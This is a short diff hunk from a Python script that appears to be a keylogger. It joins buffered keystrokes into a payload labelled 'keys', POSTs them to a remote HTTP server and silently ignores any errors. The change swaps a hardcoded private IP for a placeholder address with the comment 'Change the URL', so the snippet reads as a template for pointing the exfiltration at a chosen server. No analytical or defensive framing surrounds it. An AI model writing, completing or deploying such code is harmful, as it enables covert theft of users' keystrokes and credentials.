@@ -21,7 +21,7 @@ def f():
     if b:
         g = {"keys": ''.join(b)}
         try:
-            r.post("http://10.0.2.15:8080", data=g)
+            r.post("http://0.0.0.0:8080", data=g) # Change the URL
         except:
             pass
         b = []
